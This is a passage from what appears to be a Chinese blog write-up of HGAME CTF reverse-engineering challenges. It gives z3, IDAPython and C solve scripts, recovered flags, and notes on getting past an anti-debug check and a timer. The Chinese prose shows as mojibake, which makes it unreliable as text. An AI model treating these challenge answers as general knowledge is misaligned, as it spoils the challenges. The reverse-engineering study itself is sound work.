class="string">' '</span>, a[<span class="number">0x4558</span>] = <span class="string">'r'</span>;</span><br><span class="line">a[<span class="number">0x222F</span>] = <span class="string">'z'</span>, a[<span class="number">0xAAD0</span>] = <span class="string">'n'</span>, a[<span class="number">0x9841</span>] = <span class="string">'z'</span>, a[<span class="number">71894</span>] = <span class="string">'3'</span>;</span><br><span class="line">a[<span class="number">0x8AF0</span>] = <span class="string">'s'</span>, a[<span class="number">0x2BFF</span>] = <span class="string">'t'</span>, a[<span class="number">0x525F</span>] = <span class="string">'b'</span>, a[<span class="number">0x9995</span>] = <span class="string">'e'</span>;</span><br><span class="line">a[<span class="number">68035</span>] = <span class="string">'&#123;'</span>, a[<span class="number">0xA375</span>] = <span class="string">'q'</span>, a[<span class="number">10949</span>] = <span class="string">'f'</span>, a[<span class="number">0x63DD</span>] = <span class="string">'q'</span>;</span><br><span class="line">a[<span class="number">0xA621</span>] = <span class="string">'p'</span>, a[<span class="number">78398</span>] = <span class="string">'_'</span>, a[<span class="number">0x10780</span>] = <span class="string">'q'</span>, a[<span class="number">0x609E</span>] = <span class="string">'t'</span>;</span><br><span class="line">a[<span class="number">9603</span>] = <span class="string">'!'</span>, a[<span class="number">0x7E5F</span>] = <span class="string">'t'</span>, a[<span class="number">0x83C0</span>] = <span class="string">'x'</span>, a[<span class="number">0x8A6D</span>] = <span class="string">'z'</span>;</span><br><span class="line">a[<span class="number">0x1309A</span>] = <span class="string">'3'</span>, a[<span class="number">0xB8F4</span>] = <span class="string">'O'</span>, a[<span class="number">54430</span>] = <span class="string">'m'</span>, a[<span class="number">0x143CF</span>] = <span class="string">'w'</span>;</span><br><span class="line">a[<span class="number">40499</span>] = <span class="string">'u'</span>, a[<span class="number">0xD882</span>] = <span class="string">'u'</span>, a[<span class="number">0xB5DB</span>] = <span class="string">'f'</span>, a[<span class="number">0x931B</span>] = <span class="string">' '</span>;</span><br><span class="line">a[<span class="number">0x1FB0</span>] = <span class="string">'u'</span>, a[<span class="number">0xF2F2</span>] = <span class="string">' '</span>, a[<span class="number">0x5031</span>] = <span class="string">'m'</span>, a[<span class="number">0x12720</span>] = <span class="string">'4'</span>;</span><br><span class="line">a[<span class="number">0x6649</span>] = <span class="string">'q'</span>, a[<span class="number">0xBCA1</span>] = <span class="string">'R'</span>, a[<span class="number">24004</span>] = <span class="string">' '</span>, a[<span class="number">0x10180</span>] = <span class="string">'m'</span>;</span><br><span class="line">a[<span class="number">77170</span>] = <span class="string">'h'</span>, a[<span class="number">0x7B3C</span>] = <span class="string">'o'</span>, a[<span class="number">3019</span>] = <span class="string">'s'</span>, a[<span class="number">20120</span>] = <span class="string">' '</span>;</span><br><span class="line">a[<span class="number">74113</span>] = <span class="string">'_'</span>, a[<span class="number">0xDD23</span>] = <span class="string">','</span>, a[<span class="number">58044</span>] = <span class="string">'f'</span>, a[<span class="number">79659</span>] = <span class="string">'z'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">0xfffffff</span>; i++)</span><br><span class="line"><span class="keyword">if</span>(a[i])</span><br><span class="line"><span class="built_in">putchar</span>(a[i]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¾—åˆ°<strong>Oazsdgmpgmfuaz! ftq eqodqf ar ftq mbbe ue tqdq, ftue otmxxqzsq ue uzebudqp nk NkfqOFR arrxuzq omybmusz, ftq rxms ue tsmyq{dQh3x_y3_nk_z4F1h3_0d_zi7I0dw}</strong>ï¼Œå¯ä»¥çœ‹åˆ°æœ€åå’Œflagçš„æ ¼å¼æ˜¯ä¸€æ ·çš„äº†ï¼Œå­—ç¬¦æ•°éƒ½æ˜¯ä¸€æ ·çš„ï¼Œæ•´ä¸ªå­—ç¬¦ä¸²çš„ç‰¹å¾çŒœæµ‹å‡¯æ’’åŠ å¯†ã€‚</p><p>ä»ä½ç§»12å¾—åˆ°ç»“æœï¼š</p><p><img src="https://i.loli.net/2021/02/27/ruso9GQJk7PqxYE.png" alt="image-20210227112643799"></p><h3 id="FAKE"><a href="#FAKE" class="headerlink" title="FAKE"></a>FAKE</h3><p>å¼€å§‹æ²¡æ³¨æ„ï¼Œä»¥ä¸ºå°±æ˜¯è€ƒä¸‹z3çš„ä½¿ç”¨ï¼Œä¸”é¢˜ç›®ä¸­æœ‰æç¤ºï¼š<strong>Try angr or z3.</strong>ï¼Œä¸Šæ¥å°±æŠŠ36ä¸ªæ–¹ç¨‹ç»„å»å†™z3ï¼Œæ²¡æœ‰å‘ç°è§£ã€‚ã€‚ä¹Ÿå¯èƒ½æ˜¯æˆ‘çš„çº¦æŸæ¡ä»¶å†™é”™äº†ã€‚ã€‚</p><p>ä¹‹åæ³¨æ„åˆ°é¢˜ç›®åå­—fakeï¼Œè¿›è€Œçœ‹äº†çœ‹ç¨‹åºï¼Œå‘ç°ä¸€ä¸ªè·å–TracerPidçš„åè°ƒè¯•å’Œç´§æ¥ç€çš„smcï¼š</p><p><img src="https://i.loli.net/2021/02/27/UxcMZYkvEy4TsDh.png" alt="image-20210217162653310"></p><p>è‡ªå·±æŸ¥çœ‹ä¸€ä¸‹éè°ƒè¯•è¿è¡Œæ—¶çš„çŠ¶æ€ï¼š<br><img src="https://i.loli.net/2021/02/27/rS7LQ2zW3DjHcZx.png" alt="image-20210217162839393"></p><p>ä½¿ç”¨idapythonæˆ–è°ƒè¯•åˆ°smcåçš„ä»£ç ï¼Œå…¶å®å°±æ˜¯2ä¸ªçŸ©é˜µçš„ä¹˜æ³•ï¼š</p><p><img src="https://i.loli.net/2021/02/27/VhjmxeSoF9OPayk.png" alt="image-20210217163037584"></p><p>å…ˆz3è§£ä¸€ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">s = Solver()</span><br><span class="line">flag = [BitVec(<span class="string">'flag[%d]'</span>%i, <span class="number">8</span>) <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">36</span>)]</span><br><span class="line"></span><br><span class="line">a = [<span class="number">104</span>, <span class="number">103</span>, <span class="number">97</span>, <span class="number">109</span>, <span class="number">101</span>, <span class="number">123</span>, <span class="number">64</span>, <span class="number">95</span>, <span class="number">70</span>, <span class="number">65</span>, <span class="number">75</span>, <span class="number">69</span>, <span class="number">95</span>, <span class="number">102</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">103</span>, <span class="number">33</span>, <span class="number">45</span>, <span class="number">100</span>, <span class="number">111</span>, <span class="number">95</span>, <span class="number">89</span>, <span class="number">48</span>, <span class="number">117</span>, <span class="number">95</span>, <span class="number">107</span>, <span class="number">111</span>, <span class="number">110</span>, <span class="number">119</span>, <span class="number">95</span>, <span class="number">83</span>, <span class="number">77</span>, <span class="number">67</span>, <span class="number">63</span>, <span class="number">125</span>]</span><br><span class="line"></span><br><span class="line">b = [<span class="number">55030</span>, <span class="number">61095</span>, <span class="number">60151</span>, <span class="number">57247</span>, <span class="number">56780</span>, <span class="number">55726</span>, <span class="number">46642</span>, <span class="number">52931</span>, <span class="number">53580</span>, <span class="number">50437</span>, <span class="number">50062</span>, <span class="number">44186</span>, <span class="number">44909</span>, <span class="number">46490</span>, <span class="number">46024</span>, <span class="number">44347</span>, <span class="number">43850</span>, <span class="number">44368</span>, <span class="number">54990</span>, <span class="number">61884</span>, <span class="number">61202</span>, <span class="number">58139</span>, <span class="number">57730</span>, <span class="number">54964</span>, <span class="number">48849</span>, <span class="number">51026</span>, <span class="number">49629</span>, <span class="number">48219</span>, <span class="number">47904</span>, <span class="number">50823</span>, <span class="number">46596</span>, <span class="number">50517</span>, <span class="number">48421</span>, <span class="number">46143</span>, <span class="number">46102</span>, <span class="number">46744</span>]</span><br><span class="line">ans = [<span class="number">0</span>]*<span class="number">36</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">6</span>):</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">6</span>):</span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> range(<span class="number">6</span>):</span><br><span class="line">ans[<span class="number">6</span>*i+j] += a[<span class="number">6</span>*k+j] * flag[<span class="number">6</span>*i+k]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">6</span>):</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">6</span>):</span><br><span class="line">s.add(b[<span class="number">6</span>*i+j] == ans[<span class="number">6</span>*i+j])</span><br><span class="line"><span class="keyword">if</span> s.check() == sat:</span><br><span class="line">flag = [s.model()[i].as_long() <span class="keyword">for</span> i <span class="keyword">in</span> flag]</span><br><span class="line">print(bytes(flag))</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">print(<span class="string">"unsat"</span>)</span><br><span class="line"><span class="comment">#hgame&#123;E@sy_Se1f-Modifying_C0oodee33&#125;</span></span><br></pre></td></tr></table></figure><p>å†ä½¿ç”¨sageæ±‚è§£çœ‹ï¼Œå®è´¨å°±æ˜¯å…ˆæ±‚å¾—ä¸€ä¸ªé€†çŸ©é˜µç„¶åä¸encç»„æˆçš„çŸ©é˜µåšä¹˜æ³•ã€‚</p><p><img src="https://i.loli.net/2021/02/27/hPdyLxSuDFpTRZE.png" alt="image-20210217163948621"></p><h3 id="helloRe3"><a href="#helloRe3" class="headerlink" title="helloRe3"></a>helloRe3</h3><p>ä¸€è¡€ã€‚</p><p>å¼€å§‹æ¯ç®¡é¢˜ç›®çš„æç¤ºä¿¡æ¯ï¼Œç›´æ¥é™æ€åˆ†æäº†ä¸‹ï¼Œçœ‹è§åˆ›å»ºäº†ä¸€ä¸ªçº¿ç¨‹ï¼Œåé¢å¼€å§‹æ³¨å†Œçª—å£å„ç§æ“ä½œï¼Œç„¶åè¶Šçœ‹è¶Šå¤æ‚ï¼Œå®šä½åˆ°è¿™ä¸ªå‡½æ•°ï¼Œæœ‰ivï¼Œkeyå’ŒåŠ å¯†è§£å¯†æ“ä½œï¼Œä»å¸¸é‡è¯†åˆ«å‡ºæ˜¯teaç±»çš„åŠ å¯†ç®—æ³•ï¼Ÿä½†è¿™ä¸ªä¹Ÿæ— ä»ä¸‹æ‰‹ï¼Œç¨‹åºä¸­å¥½åƒæ²¡è°ƒç”¨è¿™é‡Œã€‚ã€‚ã€‚</p><p><img src="https://i.loli.net/2021/02/27/gdX7jNlDYhB2fJv.png" alt="image-20210217164757847"></p><p>å—¯ï¼Œï¼Œå›åˆ°é¢˜ç›®å¼€å§‹çœ‹æç¤ºä¿¡æ¯ï¼šå¼€å‘è€…ç•™ä¸‹äº†è°ƒè¯•ä¿¡æ¯ï¼Œè¯•è¯•DbgViewã€‚å°±è¯•è¯•å§ã€‚</p><p>å¯ä»¥å‘ç°ï¼Œæ¯æ¬¡è¾“å…¥éƒ½ä¼šè¾“å‡ºç›¸åº”çš„å“åº”ï¼š</p><p><img src="https://i.loli.net/2021/02/27/6AUTcPakH9fLeiq.png" alt="image-20210217165042094"></p><p>è¿™é‡Œæˆ‘ç›´æ¥å»å®šä½input lengthï¼Œå› ä¸ºä¹‹å‰é™æ€åˆ†ææ—¶çœ‹è§è¿‡ã€‚</p><p><img src="https://i.loli.net/2021/02/27/vicGJT4f5utmgY9.png" alt="image-20210217165253173"></p><p>å…¶å®ä¸Šé¢è¿™ä¸ªæ•´ä¸ªå‡½æ•°å°±æ˜¯å…³é”®äº†ï¼Œç®€å•çœ‹ä¸‹æ±‡ç¼–ï¼Œç»“åˆDbgViewã€‚</p><p>è¾“å…¥é•¿åº¦ä¸º20ï¼Œæ¯ä¸€ä½å…ˆå’Œ0xffè¿›è¡Œå¼‚æˆ–è¿ç®—ï¼Œæœ€åæ¥ä¸ªrc4åŠ å¯†å†å’Œå¯†æ–‡æ¯”è¾ƒã€‚<strong>æ³¨æ„ï¼šè¾“å…¥çš„æ˜¯æ¯ä¸ªå­—ç¬¦çš„orderå€¼ï¼Œä»DbgViewå¯ä»¥æŸ¥çœ‹ã€‚</strong></p><p>æˆ‘ç›´æ¥é™„åŠ è°ƒè¯•å¾—åˆ°å†…å­˜ä¿¡æ¯ï¼Œç„¶åidapythonå¾—åˆ°orderå€¼ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> ida_bytes <span class="keyword">import</span> *</span><br><span class="line">addr = <span class="number">0x7FF7E35B5820</span></span><br><span class="line">addr1 = <span class="number">0x07FF7E35A3720</span></span><br><span class="line">flag = []</span><br><span class="line">s = [<span class="number">21</span>, <span class="number">22</span>, <span class="number">23</span>, <span class="number">24</span>, <span class="number">25</span>, <span class="number">26</span>, <span class="number">27</span>, <span class="number">28</span>, <span class="number">29</span>, <span class="number">30</span>, <span class="number">21</span>, <span class="number">22</span>, <span class="number">23</span>, <span class="number">24</span>, <span class="number">25</span>, <span class="number">26</span>, <span class="number">27</span>, <span class="number">28</span>, <span class="number">29</span>, <span class="number">30</span>]</span><br><span class="line">s = [i^<span class="number">0xff</span> <span class="keyword">for</span> i <span class="keyword">in</span> s]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">20</span>):</span><br><span class="line">    flag += [(s[i]^get_byte(addr) ^ get_byte(addr1)) ^<span class="number">0xff</span>]</span><br><span class="line">    addr += <span class="number">1</span></span><br><span class="line">    addr1 += <span class="number">1</span></span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure><p>æœ€åç”¨Cè¯­è¨€å†™ä¸€ä¸ªç½®è¡¨å¾—åˆ°è¾“å…¥ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt; </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt; </span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> a[] = &#123;<span class="number">59</span>, <span class="number">58</span>, <span class="number">54</span>, <span class="number">72</span>, <span class="number">39</span>, <span class="number">47</span>, <span class="number">26</span>, <span class="number">31</span>,</span><br><span class="line"> <span class="number">61</span>, <span class="number">24</span>, <span class="number">61</span>, <span class="number">74</span>, <span class="number">24</span>, <span class="number">40</span>, <span class="number">32</span>, <span class="number">23</span>,</span><br><span class="line">  <span class="number">68</span>, <span class="number">24</span>, <span class="number">41</span>, <span class="number">48</span>&#125;;</span><br><span class="line"><span class="keyword">int</span> b[<span class="number">1000</span>];</span><br><span class="line"><span class="keyword">char</span> s1[] = <span class="string">"1234567890-+"</span>;</span><br><span class="line"><span class="keyword">char</span> s2[] = <span class="string">"QWERTYUIOP&#123;&#125;|"</span>;</span><br><span class="line"><span class="keyword">char</span> s3[] = <span class="string">"ASDFGHJKL;'"</span>;</span><br><span class="line"><span class="keyword">char</span> s4[] = <span class="string">"ZXCVBNM,./"</span>;</span><br><span class="line"><span class="keyword">char</span> flag[<span class="number">50</span>];</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>, j = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">21</span>; i &lt;= <span class="number">32</span>; i++)</span><br><span class="line">b[i] = s1[j++];</span><br><span class="line">j = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">37</span>; i &lt;= <span class="number">49</span>; i++)</span><br><span class="line">b[i] = s2[j++];</span><br><span class="line">j = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">54</span>; i &lt;= <span class="number">64</span>; i++)</span><br><span class="line">b[i] = s3[j++];</span><br><span class="line">j = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">66</span>; i &lt;= <span class="number">75</span>; i++)</span><br><span class="line">b[i] = s4[j++];</span><br><span class="line">j = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">20</span>; i++)</span><br><span class="line">flag[i] = b[a[i]];</span><br><span class="line"></span><br><span class="line"><span class="built_in">puts</span>(flag);</span><br><span class="line"></span><br><span class="line">&#125; </span><br><span class="line"><span class="comment">//HGAME&#123;6-K4K.4R+3C4T&#125;</span></span><br></pre></td></tr></table></figure><h3 id="vm"><a href="#vm" class="headerlink" title="vm"></a>vm</h3><p>äºŒè¡€ã€‚</p><p>ä¸€ä¸ªç®€å•çš„vmï¼Œè°ƒè¯•è·Ÿè¸ªå¾—åˆ°å…ˆæ˜¯æ‰¾åˆ°è¾“å…¥çš„æœ€åä¸€ä½ï¼Œå¼€å§‹ä»åå‘å‰è¿›è¡ŒæŒ‡å®šå€¼çš„å¼‚æˆ–è¿ç®—ï¼Œç´§æ¥ç€ä¸€è½®ä»åå‘å‰çš„å‡æ³•è¿ç®—ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> enc[] =</span><br><span class="line">&#123;</span><br><span class="line">  <span class="number">207</span>, <span class="number">191</span>, <span class="number">128</span>,  <span class="number">59</span>, <span class="number">246</span>, <span class="number">175</span>, <span class="number">126</span>,   <span class="number">2</span>,  <span class="number">36</span>, <span class="number">237</span>, </span><br><span class="line">  <span class="number">112</span>,  <span class="number">58</span>, <span class="number">244</span>, <span class="number">235</span>, <span class="number">122</span>,  <span class="number">74</span>, <span class="number">231</span>, <span class="number">247</span>, <span class="number">162</span>, <span class="number">103</span>, </span><br><span class="line">   <span class="number">23</span>, <span class="number">240</span>, <span class="number">198</span>, <span class="number">118</span>,  <span class="number">54</span>, <span class="number">232</span>, <span class="number">173</span>, <span class="number">130</span>,  <span class="number">46</span>, <span class="number">219</span>, </span><br><span class="line">  <span class="number">183</span>,  <span class="number">79</span>, <span class="number">230</span>,   <span class="number">9</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> a = <span class="number">0xfe</span>, b = <span class="number">0x7a</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>, j = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">33</span>; i &gt;= <span class="number">0</span>; i--)</span><br><span class="line">&#123;</span><br><span class="line">enc[i] += b;</span><br><span class="line">b -= <span class="number">0x60</span>;</span><br><span class="line">enc[i] ^= a;</span><br><span class="line">a += <span class="number">0x23</span>; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">34</span>; i++)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%c"</span>, enc[i]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="A-5-Second-Challenge"><a href="#A-5-Second-Challenge" class="headerlink" title="A 5 Second Challenge"></a>A 5 Second Challenge</h3><p>ä¸€ä¸ªæ‰«é›·æ¸¸æˆï¼Œç¬¬ä¸€æ­¥æ“ä½œåï¼Œå¦‚æœåé¢æ—¶é—´è¶…è¿‡5sçš„è¯æ¸¸æˆç»“æŸã€‚è¿™ä¸ªä¿®æ”¹ä¸‹ç³»ç»Ÿæ—¶é—´å°±è§£é™¤äº†ã€‚</p><p>æ‰¾åˆ°å…³é”®æ•°æ®æ–‡ä»¶å¤¹ï¼š</p><p><img src="https://i.loli.net/2021/02/27/oezlBwiY5mTZuOA.png" alt="image-20210227114208257"></p><p>åç¼–è¯‘AFiveSecondChallenge.dllï¼šçœ‹åˆ°è·å–å½“å‰ç³»ç»Ÿçš„æ—¶é—´ï¼Œæ£€æŸ¥æ˜¯å¦è¶…æ—¶çš„å‡½æ•°ï¼Œé¢˜ç›®æè¿°çš„ä¸€æ ·ï¼Œå¯¹dllåšäº†æ‰‹è„šï¼Œä¹Ÿæ˜¯<strong>CheckBomAt</strong>è¿™ä¸ªå‡½æ•°ï¼Œæœ€åæœ‰å¾ˆå¤šæ•°æ®ï¼Œä»æ•°é‡å¯ä»¥çŒœæµ‹å¯¹åº”æˆ‘ä»¬é¢˜ç›®ä¸­çš„45*45çš„æ ¼å­ã€‚</p><p><img src="https://i.loli.net/2021/02/27/CyHbQdXat52eZkR.png" alt="image-20210227114516330"></p><p>ç°åœ¨ç›®çš„å°±æ˜¯æ‰¾<strong>CheckBomAt</strong>å‡½æ•°ï¼Œå¼€å§‹æƒ³çš„æ˜¯å¯èƒ½æœ‰åŠæ³•ä¿®å¤è¿™ä¸ªdllï¼Œæœç´¢ä¸€ç•ªæ²¡æœ‰ç»“æœã€‚</p><p>è½¬åˆ°åˆšåˆšé‚£ä¸ªæ–‡ä»¶å¤¹çš„ï¼Œå‘ç°2ä¸ªå…³é”®cppæ–‡ä»¶ï¼šAFiveSecondChallenge.cppï¼ŒAssembly-CSharp.cppã€‚</p><p>åœ¨AFiveSecondChallenge.cppä¸­å‘ç°åç¼–è¯‘ä¸å‡ºæ¥çš„å‡½æ•°ï¼šä»åå­—å¯ä»¥å¾ˆå¥½è¯†åˆ«å…¶åŠŸèƒ½ï¼Œå¼€å§‹åšä¸€ä¸ªè¶…æ—¶æ£€æŸ¥ï¼Œå¦‚æœæ²¡è¶…æ—¶å–å‡ºmatrixä¸­çš„æ•°æ®åšä¸€ä¸ªè¿ç®—ååˆ¤æ–­ã€‚</p><p><img src="https://i.loli.net/2021/02/27/NdvUQpMXrFontj9.png" alt="image-20210227120034686"></p><p>ç„¶åä»Assembly-CSharp.cppä¸­çœ‹åˆ°äº†æ•´ä¸ªæ¸¸æˆé€»è¾‘ã€‚æ³¨é‡Šç›¸å½“äºæŠŠæºç éƒ½ç»™äº†å§ï¼ŒçœŸå¥½ã€‚</p><p>æ•æ‰é¼ æ ‡ç‚¹å‡»åï¼Œå¼€å§‹è¿›è¡Œå„ç§åˆ¤æ–­ã€‚</p><p><img src="https://i.loli.net/2021/02/27/4rOwLYtVzcUlDmf.png" alt="image-20210227120525813"></p><p>è®¡ç®—å‘¨å›´çš„é›·æ•°ï¼Œå°±æ˜¯åˆ¤æ–­8ä¸ªæ–¹å‘ï¼Œä¹Ÿå¯ä»¥çœ‹å‡ºè¿”å›å€¼ä¸º0ä»£è¡¨ä¸æ˜¯é›·ï¼š</p><p><img src="https://i.loli.net/2021/02/27/e9vF4mky3D5oiHp.png" alt="image-20210227122637114"></p><p>ç‚¹å‡»åï¼Œæ ¹æ®æ˜¯é›·æˆ–è€…ä¸æ˜¯é›·å¡«å……å¯¹åº”çš„è‰²å—ï¼š</p><p><img src="https://i.loli.net/2021/02/27/kB8jiNXfsgQzJ4H.png" alt="image-20210227122902913"></p><p>å¦‚æœç‚¹å‡»å—å‘¨å›´æ²¡æœ‰é›·ï¼Œåˆ™é€’å½’çš„å‘å››ä¸ªæ–¹å‘æ‰©å±•å¼€æ¥ï¼š</p><p><img src="https://i.loli.net/2021/02/27/gD1dcpLSm9QAvo2.png" alt="image-20210227123011364"></p><p>åˆ†æåˆ°è¿™é‡Œæƒ³æ‰¾æœ€åèƒœåˆ©çš„åˆ¤æ–­æ¡ä»¶ä»¥æ­¤çœ‹flagæ€ä¹ˆæ¥çš„ï¼Œå¥½åƒæ²¡æœ‰ï¼Œã€‚ã€‚</p><p>åˆ°è¿™é‡ŒçŸ¥é“äº†å…³é”®å°±æ˜¯åˆ¤æ–­ä¸€ä¸ªå—æ˜¯å¦æ˜¯é›·çš„å‡½æ•°<strong>CheckBomAt</strong>ï¼ŒæŒ‰ç…§é¢˜ç›®çš„ç®—æ³•æ‰“å°å‡ºé›·çš„ä½ç½®ï¼Œ1è¡¨ç¤ºé›·ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">double</span> a[<span class="number">45</span>][<span class="number">15</span>][<span class="number">3</span>] = &#123;æ¸¸æˆä¸­çš„æ•°æ®&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">double</span> ans;</span><br><span class="line"><span class="keyword">double</span> a_, b_, c_, d_;</span><br><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>, j = <span class="number">0</span>, k = <span class="number">0</span>, bomb[<span class="number">45</span>][<span class="number">45</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(j = <span class="number">0</span>; j &lt; <span class="number">45</span>; j++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">45</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">a_ = a[j][i/<span class="number">3</span>][<span class="number">0</span>];</span><br><span class="line">b_ = a[j][i/<span class="number">3</span>][<span class="number">1</span>];</span><br><span class="line">c_ = a[j][i/<span class="number">3</span>][<span class="number">2</span>];</span><br><span class="line">d_ = (<span class="keyword">double</span>)(i%<span class="number">3</span> - <span class="number">1.0</span>);</span><br><span class="line">ans = (a_*d_*d_ + b_*d_) + c_;</span><br><span class="line">bomb[j][i] = ans &gt; <span class="number">0.0</span> ? <span class="number">1</span>:<span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">45</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span>(j = <span class="number">0</span>; j &lt; <span class="number">45</span>; j++)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%d "</span>, bomb[i][j]);</span><br><span class="line"><span class="built_in">putchar</span>(<span class="number">10</span>);</span><br><span class="line">&#125;</span><br><span 